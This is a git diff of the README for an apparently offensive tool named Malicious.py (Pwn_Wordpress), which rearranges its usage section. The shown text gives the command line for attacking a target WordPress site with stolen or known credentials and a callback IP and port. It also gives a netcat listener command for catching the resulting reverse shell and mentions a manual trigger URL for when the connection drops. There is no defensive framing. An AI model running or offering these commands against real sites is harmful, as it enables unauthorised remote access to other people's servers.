@@ -25,7 +25,26 @@ Install by running:
     
 ## Parameters [Running Script]
 
-Help section (-h)
+### Attacking the Target Website: ###
+
+![ezgif com-video-to-gif(1)](https://github.com/Jsmoreira02/Pwn_Wordpress/assets/103542430/532470ab-161f-487d-a59b-f3d0d7366c25)
+
+
+- **The speed depends on your connection, check the stability of your connection in case there is a slowdown in execution**
+
+
+```bash 
+python3 Malicious.py -t http://<IP or domain_name> -u <Target Username> -p <Target Password> -L <LOCAL IP> -P <LOCAL PORT>
+
+```
+
+**Executing Handler**
+
+```bash 
+nc -lvp {LOCAL PORT}
+```
+
+**Help section (-h)**
 
 ```bash
 usage: Malicious.py [-h] [-t] [-u] [-p] [-L] [-P]
@@ -44,22 +63,11 @@ options:
 
 ```
 
-Attacking the Target Website: 
 
-```bash 
-python3 Malicious.py -t http://<IP or domain_name> -u <Target Username> -p <Target Password> -L <LOCAL IP> -P <LOCAL PORT>
+### In case of complications or disconnection issues, you can just manually trigger the connection at the URL link given by the program: ###
 
-```
+![Screenshot_20231109_183851](https://github.com/Jsmoreira02/Pwn_Wordpress/assets/103542430/34be1497-4887-4960-8a72-ab4c06022825)
 
-Executing Handler
-
-```bash 
-nc -lvp {LOCAL PORT}
-```
-
-The script will automatically give you the connection. 
-
-***---> In case of complications or disconnection issues, you can just manually trigger the connection at the URL link given by the program <---***
  
 ***---> Correct Syntax: "http://IP/wordpress | Wrong syntax: http://IP/wordpress/ <---***
 
